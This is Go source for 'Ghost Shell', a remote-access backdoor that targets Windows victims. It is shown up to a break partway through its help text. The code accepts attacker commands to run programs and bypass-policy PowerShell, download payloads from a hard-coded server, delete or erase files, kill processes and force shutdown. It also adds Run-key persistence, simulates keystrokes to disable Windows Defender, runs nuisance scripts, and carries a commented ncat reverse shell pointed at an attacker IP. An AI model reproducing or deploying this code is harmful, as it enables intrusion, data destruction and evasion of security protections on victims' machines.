/*

░▒▓███████▓▒░░▒▓███████▓▒░▒▓████████▓▒░▒▓███████▓▒░░▒▓████████▓▒░
░▒▓█▓▒ ░▒▓█▓▒░      ░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒ ░▒▓█▓▒░▒▓█▓▒ ░▒▓█▓▒░
░▒▓█▓▒ ░▒▓█▓▒░      ░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒ ░▒▓█▓▒░▒▓█▓▒ ░▒▓█▓▒░
░▒▓███████▓▒░░▒▓███████▓▒░  ░▒▓█▓▒░   ░▒▓███████▓▒░░▒▓█▓▒ ░▒▓█▓▒░
░▒▓█▓▒ ░▒▓█▓▒░      ░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒ ░▒▓█▓▒░▒▓█▓▒ ░▒▓█▓▒░
░▒▓█▓▒ ░▒▓█▓▒░      ░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒ ░▒▓█▓▒░▒▓█▓▒ ░▒▓█▓▒░
░▒▓█▓▒ ░▒▓█▓▒░▒▓███████▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒ ░▒▓█▓▒░▒▓████████▓▒░
Nonpartisan and secular, yet always standing with the marginalized
and oppressed. ---------------------------> retrochorizo@proton.me

*/

package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"github.com/micmonay/keybd_event"
)

// Fonction sendAlert pour envoyer une alerte au serveur raspberry pi
func sendAlert() {

}

// Fonction pour mapper un slice de chaînes en codes VK
func StringToVK(keyList []string) []int {
	vkMap := map[string]int{
		"a":     keybd_event.VK_A,
		"b":     keybd_event.VK_B,
		"c":     keybd_event.VK_C,
		"d":     keybd_event.VK_D,
		"e":     keybd_event.VK_E,
		"f":     keybd_event.VK_F,
		"g":     keybd_event.VK_G,
		"h":     keybd_event.VK_H,
		"i":     keybd_event.VK_I,
		"j":     keybd_event.VK_J,
		"k":     keybd_event.VK_K,
		"l":     keybd_event.VK_L,
		"m":     keybd_event.VK_M,
		"n":     keybd_event.VK_N,
		"o":     keybd_event.VK_O,
		"p":     keybd_event.VK_P,
		"q":     keybd_event.VK_Q,
		"r":     keybd_event.VK_R,
		"s":     keybd_event.VK_S,
		"t":     keybd_event.VK_T,
		"u":     keybd_event.VK_U,
		"v":     keybd_event.VK_V,
		"w":     keybd_event.VK_W,
		"x":     keybd_event.VK_X,
		"y":     keybd_event.VK_Y,
		"z":     keybd_event.VK_Z,
		"0":     keybd_event.VK_0,
		"1":     keybd_event.VK_1,
		"2":     keybd_event.VK_2,
		"3":     keybd_event.VK_3,
		"4":     keybd_event.VK_4,
		"5":     keybd_event.VK_5,
		"6":     keybd_event.VK_6,
		"7":     keybd_event.VK_7,
		"8":     keybd_event.VK_8,
		"9":     keybd_event.VK_9,
		"enter": keybd_event.VK_ENTER,
		"space": keybd_event.VK_SPACE,
		"tab":   keybd_event.VK_TAB,
		"esc":   keybd_event.VK_SP1,
		"up":    keybd_event.VK_UP,
		"down":  keybd_event.VK_DOWN,
		"left":  keybd_event.VK_LEFT,
		"right": keybd_event.VK_RIGHT,
	}

	var vkCodes []int
	for _, key := range keyList {
		if vk, ok := vkMap[key]; ok {
			vkCodes = append(vkCodes, vk)
		} else {
			fmt.Printf("Touche non mappée: %s\n", key)
		}
	}
	return vkCodes
}

var (
	// attackerIP
	attackerIP string = "192.168.0.22"
	serverip   string = "000.000.0.00"
	victimPort int    = 5555
)

func handleConnection(conn net.Conn) {
	defer conn.Close()

	reader := bufio.NewReader(conn)
	fmt.Fprintln(conn, "")
	fmt.Fprintln(conn, "+---------------------------------------------+")
	fmt.Fprintln(conn, "\033[1;31mR3TR0 GH0ST_SHELL_project V1.7\033[0m")
	fmt.Fprintln(conn, "+---------------------------------------------+")
	fmt.Fprintln(conn, " ▄███████▄     ▄████████    ▄████████  ▄██████▄  ")
	fmt.Fprintln(conn, "██▀     ▄██   ███    ███   ███    ███ ███    ███ ")
	fmt.Fprintln(conn, "      ▄███▀   ███    █▀    ███    ███ ███    ███ ")
	fmt.Fprintln(conn, " ▀█▀▄███▀▄▄  ▄███▄▄▄      ▄███▄▄▄▄██▀ ███    ███ ")
	fmt.Fprintln(conn, "  ▄███▀   ▀ ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   ███    ███ ")
	fmt.Fprintln(conn, "▄███▀         ███    █▄  ▀███████████ ███    ███ ")
	fmt.Fprintln(conn, "███▄     ▄█   ███    ███   ███    ███ ███    ███ ")
	fmt.Fprintln(conn, " ▀████████▀   ██████████   ███    ███  ▀██████▀  ")
	fmt.Fprintln(conn, "                           ██▀    █▀             ")
	fmt.Fprintln(conn, "  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+  ")
	fmt.Fprintln(conn, "  |T|h|e| |h|a|c|k|e|r| |b|e|s|t| |f|r|i|e|n|d|  ")
	fmt.Fprintln(conn, "  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+  ")
	fmt.Fprintln(conn, "")
	fmt.Fprintln(conn, "Type \033[1;31m'help'\033[0m for available commands")
	fmt.Fprintln(conn, "___________________________________________________")
	fmt.Fprintln(conn, "")

	for {
		fmt.Fprint(conn, "Z3R0 /-> ")

		message, err := reader.ReadString('\n')
		if err != nil {
			log.Println("Error reading:", err)
		}
		message = strings.TrimSpace(message)

		addrs, err := net.InterfaceAddrs()
		if err != nil {
			fmt.Println("Error:", err)
		}
		// TOUTES LES COMMANDES
		switch {
		case message == "check":
			fmt.Fprintln(conn, "awake")
			fmt.Fprintf(conn, "\n")

		case message == "get_ip":
			for _, addr := range addrs {
				if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
					if ipnet.IP.To4() != nil {
						fmt.Fprintln(conn, "IPv4 Address:", ipnet.IP.String())
						fmt.Fprintf(conn, "\n")
					}
				}
			}
			resp, err := http.Get("https://api64.ipify.org?format=text")
			if err != nil {
				fmt.Fprintf(conn, "Error getting global IP address: %s\n", err)
				fmt.Fprintf(conn, "\n")
			}
			defer resp.Body.Close()

			globalIP, err := ioutil.ReadAll(resp.Body)
			if err != nil {
				fmt.Fprintf(conn, "Error reading global IP address: %s\n", err)
				fmt.Fprintf(conn, "\n")
			} else {
				fmt.Fprintf(conn, "Global IP Address: %s\n", string(globalIP))
				fmt.Fprintf(conn, "\n")
			}

		case message == "get_os":
			fmt.Fprintln(conn, runtime.GOOS)
			fmt.Fprintf(conn, "\n")

		case strings.HasPrefix(message, "run"):
			// Extrait le nom du programme de la commande
			parts := strings.Fields(message)
			if len(parts) < 2 {
				fmt.Fprintln(conn, "Usage: run <programname>")
				fmt.Fprintf(conn, "\n")
			}
			program := parts[1]

			// Exécute la commande "start" pour exécuter le programme spécifié
			cmd := exec.Command("cmd", "/c", "start", program)
			err := cmd.Run()
			if err != nil {
				fmt.Fprintf(conn, "Error executing command: %s\n", err)
				fmt.Fprintf(conn, "\n")
			} else {
				fmt.Fprintln(conn, "Program executed successfully")
				fmt.Fprintf(conn, "\n")
			}

		case strings.HasPrefix(message, "ps"):
			// Extraire le chemin du fichier PS1 de la commande
			parts := strings.Fields(message)
			if len(parts) < 2 {
				fmt.Fprintln(conn, "Usage: ps <path_to_ps1_file>")
				fmt.Fprintf(conn, "\n")
			}
			filePath := parts[1]

			// Exécuter le fichier PowerShell
			cmd := exec.Command("powershell.exe", "-ExecutionPolicy", "Bypass", "-File", filePath)

			// Capturer la sortie de la commande et les erreurs
			output, err := cmd.CombinedOutput()
			if err != nil {
				fmt.Fprintf(conn, "Error executing PowerShell script: %s\n", err)
				fmt.Fprintf(conn, "\n")
			} else {
				fmt.Fprintf(conn, "PowerShell script executed successfully:\n%s\n", output)
				fmt.Fprintf(conn, "\n")
			}

		case strings.HasPrefix(message, "download"):
			// Extrait l'adresse à télécharger de la commande
			parts := strings.Fields(message)
			if len(parts) < 2 {
				fmt.Fprintln(conn, "Usage: download <url>")
				fmt.Fprintf(conn, "\n")
			}
			url := parts[1]

			// Exécute la commande "curl" pour télécharger le fichier depuis l'URL spécifiée
			cmd := exec.Command("cmd", "/c", "curl", "-O", url)
			err := cmd.Run()
			if err != nil {
				fmt.Fprintf(conn, "Error downloading file: %s\n", err)
				fmt.Fprintf(conn, "\n")
			} else {
				fmt.Fprintln(conn, "File downloaded successfully")
				fmt.Fprintf(conn, "\n")
			}

		case strings.HasPrefix(message, "get_file"):
			// Extraire le nom du fichier à récupérer de la commande
			parts := strings.Fields(message)
			if len(parts) < 2 {
				fmt.Fprintln(conn, "Usage: get_file <filename>")
				fmt.Fprintf(conn, "\n")
			}
			filename := parts[1]

			// Lire le contenu du fichier depuis l'ordinateur de la victime
			content, err := ioutil.ReadFile(filename)
			if err != nil {
				fmt.Fprintf(conn, "Error reading file: %s\n", err)
				fmt.Fprintf(conn, "\n")
			}

			// Définir le chemin du fichier sur l'ordinateur de l'attaquant
			attackerFilePath := filename

			// Écrire le contenu du fichier dans un nouveau fichier sur l'ordinateur de l'attaquant
			err = ioutil.WriteFile(attackerFilePath, content, 0644)
			if err != nil {
				fmt.Fprintf(conn, "Error writing file: %s\n", err)
				fmt.Fprintf(conn, "\n")
			} else {
				fmt.Fprintf(conn, "File %s successfully retrieved and saved as %s\n", filename, attackerFilePath)
				fmt.Fprintf(conn, "\n")
			}

		case message == "ls":
			// Exécute la commande "dir" pour lister les fichiers dans le répertoire courant
			cmd := exec.Command("cmd", "/c", "dir")

			// Capture la sortie de la commande
			output, err := cmd.CombinedOutput()
			if err != nil {
				fmt.Fprintf(conn, "Error listing files: %s\n", err)
				fmt.Fprintf(conn, "\n")
			} else {
				fmt.Fprintf(conn, "%s\n", output)
				fmt.Fprintf(conn, "\n")
			}

		case message == "ls_hidden":
			// Exécute la commande "dir -hidden"
			cmd := exec.Command("cmd", "/c", "dir", "-hidden")

			// Capture la sortie de la commande
			output, err := cmd.CombinedOutput()
			if err != nil {
				fmt.Fprintf(conn, "Error listing files: %s\n", err)
				fmt.Fprintf(conn, "\n")
			} else {
				fmt.Fprintf(conn, "%s\n", output)
				fmt.Fprintf(conn, "\n")
			}

		case strings.HasPrefix(message, "delete"):
			// Extrait le nom du fichier à supprimer de la commande
			parts := strings.Fields(message)
			if len(parts) < 2 {
				fmt.Fprintln(conn, "Usage: delete <filename>")
				fmt.Fprintf(conn, "\n")
			}
			filename := parts[1]

			// Exécute la commande "del" pour supprimer le fichier spécifié
			cmd := exec.Command("cmd", "/c", "del", filename)
			err := cmd.Run()
			if err != nil {
				fmt.Fprintf(conn, "Error deleting file: %s\n", err)
				fmt.Fprintf(conn, "\n")
			} else {
				fmt.Fprintln(conn, "File deleted successfully")
				fmt.Fprintf(conn, "\n")
			}

		case message == "erase":
			// Exécute la commande "del" pour supprimer tous les fichiers du répertoire courant
			cmd := exec.Command("cmd", "/c", "del", "*.*")

			// Capture la sortie de la commande
			output, err := cmd.CombinedOutput()
			if err != nil {
				fmt.Fprintf(conn, "Error destroying files: %s\n", err)
				fmt.Fprintf(conn, "\n")
			} else {
				fmt.Fprintf(conn, "Files destroyed successfully: %s\n", output)
				fmt.Fprintf(conn, "\n")
			}

		case message == "pwd":
			// Exécute la commande "cd" suivie de "echo %cd%" pour obtenir le répertoire courant
			cmd := exec.Command("cmd", "/c", "cd && echo %cd%")

			// Capture la sortie de la commande
			output, err := cmd.CombinedOutput()
			if err != nil {
				fmt.Fprintf(conn, "Error getting current directory: %s\n", err)
				fmt.Fprintf(conn, "\n")
			} else {
				fmt.Fprintf(conn, "Current directory: %s\n", output)
				fmt.Fprintf(conn, "\n")
			}

		case strings.HasPrefix(message, "cd"):
			// Extraire le chemin du répertoire à changer de la commande
			parts := strings.Fields(message)
			if len(parts) < 2 {
				fmt.Fprintln(conn, "Usage: cd <directory>")
				fmt.Fprintf(conn, "\n")
			}
			directory := parts[1]

			// Changer de répertoire
			err := os.Chdir(directory)
			if err != nil {
				fmt.Fprintf(conn, "Error changing directory: %s\n", err)
				fmt.Fprintf(conn, "\n")
			}

			// Renvoyer le chemin du nouveau répertoire courant au client
			newDir, err := os.Getwd()
			if err != nil {
				fmt.Fprintf(conn, "Error getting current directory: %s\n", err)
				fmt.Fprintf(conn, "\n")
			} else {
				fmt.Fprintf(conn, "Directory changed to: %s\n", newDir)
				fmt.Fprintf(conn, "\n")
			}

		case strings.HasPrefix(message, "set_dns"):
			// Diviser la commande en parties pour obtenir le nom et l'adresse IP du serveur DNS
			parts := strings.Fields(message)
			if len(parts) < 3 {
				fmt.Fprintln(conn, "Usage: set_dns <name> <ip_address>")
				fmt.Fprintf(conn, "\n")
			}
			name := parts[1]
			ip := parts[2]

			// Créer la commande pour ajouter une entrée DNS
			cmd := exec.Command("cmd", "/c", "netsh", "interface", "ipv4", "add", "dnsserver", "name=", name, "address=", ip, "index=1")

			// Exécuter la commande
			err := cmd.Run()
			if err != nil {
				fmt.Fprintf(conn, "Error setting DNS server: %s\n", err)
				fmt.Fprintf(conn, "\n")
			} else {
				fmt.Fprintln(conn, "DNS server set successfully")
				fmt.Fprintf(conn, "\n")
			}

		case message == "ncat":
			// installe ncat sur la machine
			cmd := exec.Command("cmd", "/c", "choco", "install", "nmap")
			err := cmd.Run()
			if err != nil {
				fmt.Fprintf(conn, "Error installing ncat: %s\n", err)
				fmt.Fprintf(conn, "\n")
			} else {
				fmt.Fprintln(conn, "ncat installed successfully")
				fmt.Fprintf(conn, "\n")
			}

		case strings.HasPrefix(message, "kill"):
			// Extrait le PID ou le nom du processus à terminer de la commande
			parts := strings.Fields(message)
			if len(parts) < 2 {
				fmt.Fprintln(conn, "Usage: kill <pid>")
				fmt.Fprintf(conn, "\n")
			}
			process := parts[1]

			// Exécute la commande "taskkill" pour terminer le processus spécifié
			cmd := exec.Command("cmd", "/c", "taskkill", "/F", "/IM", process)
			err := cmd.Run()
			if err != nil {
				fmt.Fprintf(conn, "Error killing process: %s\n", err)
				fmt.Fprintf(conn, "\n")
			} else {
				fmt.Fprintln(conn, "Process killed successfully")
				fmt.Fprintf(conn, "\n")
			}

		case message == "ps":
			// Exécute la commande "tasklist" pour lister les processus
			cmd := exec.Command("cmd", "/c", "tasklist")

			// Capture la sortie de la commande
			output, err := cmd.CombinedOutput()
			if err != nil {
				fmt.Fprintf(conn, "Error listing processes: %s\n", err)
				fmt.Fprintf(conn, "\n")
			} else {
				fmt.Fprintf(conn, "Processes:\n%s\n", output)
				fmt.Fprintf(conn, "\n")
			}

		case message == "windefucker":
			// Envoyer les frappes de clavier pour effectuer l'action
			go func(conn net.Conn) {
				// Créer une nouvelle instance de KeybdEvent
				kb, err := keybd_event.NewKeyBonding()
				if err != nil {
					fmt.Fprintf(conn, "Error creating KeybdEvent instance: %s\n", err)
					fmt.Fprintf(conn, "\n")
				}

				// Envoyer les frappes de clavier en séquence
				// Envoyer la touche WIN
				kb.HasSuper(true)
				kb.Launching()
				kb.HasSuper(false)

				time.Sleep(100 * time.Millisecond)

				// Envoyer "def"
				kb.SetKeys(keybd_event.VK_D, keybd_event.VK_E, keybd_event.VK_F)
				kb.Launching()
				time.Sleep(310 * time.Millisecond)

				kb.SetKeys(keybd_event.VK_ENTER)
				kb.Launching()
				time.Sleep(200 * time.Millisecond)

				kb.SetKeys(keybd_event.VK_ENTER)
				kb.Launching()
				time.Sleep(200 * time.Millisecond)

				kb.SetKeys(keybd_event.VK_TAB)
				kb.Launching()
				time.Sleep(200 * time.Millisecond)

				kb.SetKeys(keybd_event.VK_TAB)
				kb.Launching()
				time.Sleep(200 * time.Millisecond)

				kb.SetKeys(keybd_event.VK_TAB)
				kb.Launching()
				time.Sleep(200 * time.Millisecond)

				kb.SetKeys(keybd_event.VK_TAB)
				kb.Launching()
				time.Sleep(200 * time.Millisecond)

				kb.SetKeys(keybd_event.VK_ENTER)
				kb.Launching()
				time.Sleep(200 * time.Millisecond)

				kb.SetKeys(keybd_event.VK_SPACE)
				kb.Launching()
				time.Sleep(200 * time.Millisecond)

				kb.HasALT(true)
				kb.SetKeys(keybd_event.VK_F4)
				kb.Launching()
				kb.HasALT(false)

				fmt.Fprintln(conn, "Commande 'windefucker' exécutée avec succès.")
				fmt.Fprintf(conn, "\n")
			}(conn)

		case message == "migrate":
			// essaye de migrer le procecuss dans un autre c'est mega chaud ...

		case message == "shell":
			// eveille beaucoup trop les soupcons
			/*
				exec.Command("ncat", attackerIP, "4444", "-e", "powershell")
				fmt.Fprintln(conn, "shell opened on windows")
			*/

		case strings.HasPrefix(message, "set_attacker"):
			// Diviser la commande en parties pour obtenir la nouvelle adresse IP de l'attaquant
			parts := strings.Fields(message)
			if len(parts) < 2 {
				fmt.Fprintln(conn, "Usage: set_attacker <new_attacker_IP>")
				fmt.Fprintf(conn, "\n")
			}
			newAttackerIP := parts[1]

			// Mettre à jour l'adresse IP de l'attaquant
			attackerIP = newAttackerIP

			// Envoyer un message de confirmation au client
			fmt.Fprintf(conn, "Attacker IP updated to: %s\n", newAttackerIP)
			fmt.Fprintf(conn, "\n")

		case message == "get_attacker":
			// Envoyer l'adresse IP de l'attaquant au client
			fmt.Fprintf(conn, "Attacker IP: %s\n", attackerIP)
			fmt.Fprintf(conn, "\n")

		case message == "quit":
			// Envoyer un message de confirmation au client
			fmt.Fprintln(conn, "get back soon, we will miss you!")
			// Fermer la connexion avec le client
			conn.Close()

		case message == "persist":
			// Nom du programme à ajouter au démarrage
			filename := "gs.exe"

			// Chemin complet de l'exécutable
			path := "C:\\Program Files\\Windows Mail\\" + filename

			// Copier le fichier exécutable dans le dossier Program Files
			if err := os.Rename(filename, path); err != nil {
				fmt.Fprintln(conn, "Error moving file:", err)
				fmt.Fprintf(conn, "\n")
			}

			// Créer la commande pour ajouter une clé de registre pour exécuter le backdoor au démarrage
			cmd := exec.Command("reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "BackdoorName", "/t", "REG_SZ", "/d", path, "/f")

			// Exécuter la commande
			if err := cmd.Run(); err != nil {
				fmt.Fprintln(conn, "Error adding registry key for persistence:", err)
				fmt.Fprintf(conn, "\n")
			} else {
				fmt.Fprintln(conn, "Registry key added for persistence successfully")
				fmt.Fprintf(conn, "\n")
			}

		case message == "calcexpress":
			// Chemin du fichier pour enregistrer le script PowerShell
			scriptFilePath := "calcexpress.ps1"

			// Contenu du script PowerShell
			mouseScript :=
				`
			Add-Type -AssemblyName System.Windows.Forms
		
			function Watch-MouseCoordinates {
			$prevX = [System.Windows.Forms.Cursor]::Position.X
			$prevY = [System.Windows.Forms.Cursor]::Position.Y
		
			while ($true) {
				$currentX = [System.Windows.Forms.Cursor]::Position.X
				$currentY = [System.Windows.Forms.Cursor]::Position.Y
		
				if (($currentX -ne $prevX) -or ($currentY -ne $prevY)) {
					Start-Process calc.exe -NoNewWindow
					$prevX = $currentX
					$prevY = $currentY
				}
		
				Start-Sleep -Milliseconds 100
			}
			}
		
			Watch-MouseCoordinates
			`

			// Écriture du script PowerShell dans un fichier
			err := ioutil.WriteFile(scriptFilePath, []byte(mouseScript), 0644)
			if err != nil {
				fmt.Fprintf(conn, "Error writing PowerShell script to file: %s\n", err)
				fmt.Fprintf(conn, "\n")
			}

			// Exécution du script PowerShell dans un processus séparé
			cmd := exec.Command("powershell.exe", "-ExecutionPolicy", "Bypass", "-File", scriptFilePath)
			err = cmd.Start()
			if err != nil {
				fmt.Fprintf(conn, "Error executing PowerShell script: %s\n", err)
				fmt.Fprintf(conn, "\n")
			} else {
				fmt.Fprintln(conn, "PowerShell script executed successfully for calcexpress")
				fmt.Fprintf(conn, "\n")
			}
			defer os.Remove(scriptFilePath) // Supprimer le fichier temporaire après utilisation

		case message == "mouselocker":
			// Chemin du fichier pour enregistrer le script PowerShell
			scriptFilePath := "mouselocker.ps1"

			// Contenu du script PowerShell
			mouseScript :=
				`
			add-type -AssemblyName System.Windows.Forms

			function mouse_locker {

				while ($true){
				$cursor = [System.Windows.Forms.Cursor]::Position
				[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0,0)
				$cursor = [System.Windows.Forms.Cursor]::Position
				}
			}

			mouse_locker

			`

			// Écriture du script PowerShell dans un fichier
			err := ioutil.WriteFile(scriptFilePath, []byte(mouseScript), 0644)
			if err != nil {
				fmt.Fprintf(conn, "Error writing PowerShell script to file: %s\n", err)
				fmt.Fprintf(conn, "\n")
			}

			// Exécution du script PowerShell dans un processus séparé
			cmd := exec.Command("powershell.exe", "-ExecutionPolicy", "Bypass", "-File", scriptFilePath)
			err = cmd.Start()
			if err != nil {
				fmt.Fprintf(conn, "Error executing PowerShell script: %s\n", err)
				fmt.Fprintf(conn, "\n")
			} else {
				fmt.Fprintln(conn, "PowerShell script executed successfully for mouselocker")
				fmt.Fprintf(conn, "\n")
			}
			defer os.Remove(scriptFilePath) // Supprimer le fichier temporaire après utilisation

		case message == "folderexpress":
			// crée un dosser dans le bureau chaque 200 millisecondes
			go func() {
				for {
					// Chemin du dossier à créer
					folderPath := "C:\\Users\\Public\\Desktop\\" + fmt.Sprintf("%d", rand.Int())

					// Créer le dossier

					err := os.Mkdir(folderPath, 0755)
					if err != nil {
						fmt.Fprintf(conn, "Error creating folder: %s\n", err)
						fmt.Fprintf(conn, "\n")
					}

					// Attendre 200 millisecondes avant de créer un nouveau dossier
					time.Sleep(200 * time.Millisecond)
				}
			}()

		case message == "shutdown":
			// Exécute la commande "shutdown" pour éteindre l'ordinateur de la victime
			cmd := exec.Command("shutdown", "/s", "/f", "/t", "0")

			// Exécute la commande
			err := cmd.Run()
			if err != nil {
				fmt.Fprintln(conn, "Error executing shutdown command:", err)
				fmt.Fprintf(conn, "\n")
			} else {
				fmt.Fprintln(conn, "Computer is shutting down...")
				fmt.Fprintf(conn, "\n")
			}

		case strings.HasPrefix(message, "message"):
			// Extraire le message à afficher de la commande
			parts := strings.SplitN(message, " ", 2)
			if len(parts) < 2 {
				fmt.Fprintln(conn, "Usage: message <your_message>")
				fmt.Fprintf(conn, "\n")
				return
			}
			msg := parts[1]

			// Créer le script VBScript pour afficher le message
			script := fmt.Sprintf(`
				Set objArgs = WScript.Arguments
				messageText = objArgs(0)
				MsgBox messageText
			`, msg)

			// Écrire le script VBScript dans un fichier temporaire
			scriptFile := "message.vbs"
			err := ioutil.WriteFile(scriptFile, []byte(script), 0644)
			if err != nil {
				fmt.Fprintf(conn, "Error writing VBScript file: %s\n", err)
				fmt.Fprintf(conn, "\n")
				return
			}
			defer os.Remove(scriptFile) // Supprimer le fichier temporaire après utilisation

			// Exécuter le script VBScript pour afficher le message
			cmd := exec.Command("cscript", scriptFile)
			err = cmd.Run()
			if err != nil {
				fmt.Fprintf(conn, "Error displaying message: %s\n", err)
				fmt.Fprintf(conn, "\n")
			} else {
				fmt.Fprintln(conn, "Message displayed successfully")
				fmt.Fprintf(conn, "\n")
			}

		case message == "escalate":
			// Exécuter la commande "runas" pour essayer d'obtenir des privilèges administratifs
			cmd := exec.Command("runas", "/user:Administrator", "cmd", "/c", "echo Elevated Command Prompt")

			// Exécuter la commande
			err := cmd.Run()
			if err != nil {
				fmt.Fprintf(conn, "Error executing escalate command: %s\n", err)
				fmt.Fprintf(conn, "\n")

			} else {
				fmt.Fprintln(conn, "Escalation to administrator privileges attempted successfully")
				fmt.Fprintf(conn, "\n")
			}

		case strings.HasPrefix(message, "keyboard"):
			// Extraire les touches à envoyer de la commande
			parts := strings.SplitN(message, " ", 2)
			if len(parts) < 2 {
				fmt.Fprintln(conn, "Usage: keyboard <key1,key2,...>")
				fmt.Fprintf(conn, "\n")
			}
			keys := parts[1]

			// Créer une nouvelle instance de l'événement du clavier
			kb, err := keybd_event.NewKeyBonding()
			if err != nil {
				fmt.Fprintf(conn, "Error creating key bonding: %s\n", err)
				fmt.Fprintf(conn, "\n")
			}

			// Diviser les touches en une liste
			keyList := strings.Split(keys, ",")

			vkCodes := StringToVK(keyList)
			for _, key := range vkCodes {
				// Appuyer sur la touche spécifiée
				kb.SetKeys(key)
				err := kb.Launching()
				if err != nil {
					fmt.Fprintf(conn, "Error sending key: %s\n", err)
					fmt.Fprintf(conn, "\n")
				}
			}

		case message == "info":

			fmt.Fprintln(conn, "Ghost Shell is a remote administration tool written in Go. It provides various commands to interact with the target machine,")
			fmt.Fprintln(conn, "such as checking the server status, getting IP addresses, executing shell commands, listing processes, killing processes, ")
			fmt.Fprintln(conn, "escalating privileges, and more. It also includes features like keylogging, opening a reverse shell, persisting the backdoor,")
			fmt.Fprintln(conn, "and controlling the mouse and keyboard.")
			fmt.Fprintln(conn, "Disclaimer: This tool is for educational purposes only. The author is not responsible for any misuse of this tool.")
			fmt.Fprintln(conn, "please use it with caution and only on authorized systems.")
			fmt.Fprintf(conn, "\n")
			fmt.Fprintln(conn, "ps: This tool is still in development and may contain bugs or incomplete features.")
			fmt.Fprintf(conn, "\n")
			fmt.Fprintln(conn, "\033[1;31mAuthor: R3TR0\033[0m Nonpartisan and secular")
			fmt.Fprintln(conn, "\033[1;31mVersion: 1.7\033[0m")

		case message == "update":
			// Exécute la commande "curl" pour mettre à jour le backdoor depuis le serveur raspberry pi
			cmd := exec.Command("curl", "-o", "gs.exe", "http://"+serverip+":2222/ghost_shell.exe")
			err := cmd.Run()
			if err != nil {
				fmt.Fprintf(conn, "Error updating backdoor: %s\n", err)
				fmt.Fprintf(conn, "\n")
			} else {
				fmt.Fprintln(conn, "Backdoor updated successfully")
				fmt.Fprintf(conn, "\n")
			}

		case message == "stop":
			// Exécute la commande "taskkill" pour arrêter le processus du backdoor
			cmd := exec.Command("taskkill", "/F", "/IM", "gs.exe")
			err := cmd.Run()
			if err != nil {
				fmt.Fprintf(conn, "Error stopping backdoor: %s\n", err)
				fmt.Fprintf(conn, "\n")
			} else {
				fmt.Fprintln(conn, "Backdoor stopped successfully")
				fmt.Fprintf(conn, "\n")
			}

		case message == "get_screen":

		case message == "get_cam":

		case message == "get_mic":

		case message == "keylogger":

		case message == "help":
			fmt.Fprintln(conn, "________________________________________")
			fmt.Fprintln(conn, "________________________________________")
			fmt.Fprintln(conn, "\033[1;31mAvailable commands:\033[0m")
			fmt.Fprintln(conn, "________________________________________")
			fmt.Fprintln(conn, "\033[1;31mcheck:\033[0m Check if server is up")
			fmt.Fprintln(conn, "\033[1;31mget_ip:\033[0m Get server local and global IP address")
			fmt.Fprintln(conn, "________________________________________")
			fmt.Fprintln(conn, "\033[1;31mget_os:\033[0m Give the os name")
			fmt.Fprintln(conn, "\033[1;31mset_attacker\033[0m <ip adress>: Change the attacker IP")
			fmt.Fprintln(conn, "\033[1;31mget_attacker:\033[0m Get the attacker IP")
			fmt.Fprintln(conn, "\033[1;31mncat:\033[0m Try to install ncat")
			fmt.Fprintln(conn, "\033[1;31mshell:\033[0m Run a rev shell connection on port 4444 based on attackerip (if ncat is installed)")
			fmt.Fprintln(conn, "________________________________________")
			fmt.Fprintln(conn, "\033[1;31mps:\033[0m List all the process")
			fmt.Fprintln(conn, "\033[1;31mkill\033[0m <pid>: Kill a process")
			fmt.Fprintln(conn, "\033[1;31mmigrate:\033[0m Try to migrate the process to another process (Not implemented yet)")
			fmt.Fprintln(conn, "\033[1;31mpersist:\033[0m Make the backdoor run at startup")
			fmt.Fprintln(conn, "\033[1;31mescalate:\033[0m Try to escalate the privileges to admin")
			fmt.Fprintln(conn, "________________________________________")
			fmt.Fprintln(conn, "\033[1;31mset_dns\033[0m <name> <ip adress>: Try to change the dns (Dosent work)")
			fmt.Fprintln(conn, "\033[1;31mwindefucker:\033[0m Stop windows defender realtime protection")
			fmt.Fprintln(conn, "________________________________________")
			fmt.Fprintln(conn, "\033[1;31mcalcexpress:\033[0m Run calcexpress (Open a clacultater every time the mouse move )")
			fmt.Fprintln(conn, "\033[1;31mfolderexpress:\033[0m Run folderexpress (Create a new folder on desktop every 200ms)")
			fmt.Fprintln(conn, "\033[1;31mmouselocker:\033[0m Run mouselocker (Lock the mouse on 0x 0y)")
			fmt.Fprintln(conn, "________________________________________")
			fmt.Fprintln(conn, "\033[1;31mshutdown:\033[0m Shutdown the victim pc")
			fmt.Fprintln(conn, "\033[1;31mmessage\033[0m <text>: Send a message to the victim")
			fmt.Fprintln(conn, "\033[1;31mkeyboard:\033[0m <key1,key2...>: Send keystrokes")
			fmt.Fprintln(conn, "________________________________________")
			fmt.Fprintln(conn, "\033[1;31mget_screen:\033[0m Get screen stream (Not implemented yet)")
			fmt.Fprintln(conn, "\033[1;31mget_cam:\033[0m Get webcam stream (Not implemented yet)")
			fmt.Fprintln(conn, "\033[1;31mget_mic:\033[0m Get microphone stream (Not implemented yet)")
			fmt.Fprintln(conn, "\033[1;31keylogger:\033[0m Get keyboard stream (Not implemented yet)")
			fmt.Fprintln(conn, "________________________________________")
			fmt.Fprintln(conn, "\033[1;31mls:\033[0m List files in the current directory")
			fmt.Fprintln(conn, "\033[1;31mls_hidden:\033[0m List hidden files")
			fmt.Fprintln(conn, "\033[1;31mpwd:\033[0m Print the current working directory")
			fmt.Fprintln(conn, "\033[1;31mcd:\033[0m Change directory")
			fmt.Fprintln(conn, "\033[1;31mrun\033[0m <programname>: Execute a program")
			fmt.Fprintln(conn, "\033[1;31mps\033[0m <programname>: Execute a program PS1 (powershell)")
			fmt.Fprintln(conn, "\033[1;31mdownload\033[0m <filename>: Download a file")
			fmt.Fprintln(conn, "\033[1;31mget_file\033[0m <filename>: Upload the file to the attacker server (Dosent work yet)")
			fmt.Fprintln(conn, "\033[1;31mdelete\033[0m <filename>: Delete a file")
			fmt.Fprintln(conn, "\033[1;31merase:\033[0m Delete all files in the current directory")
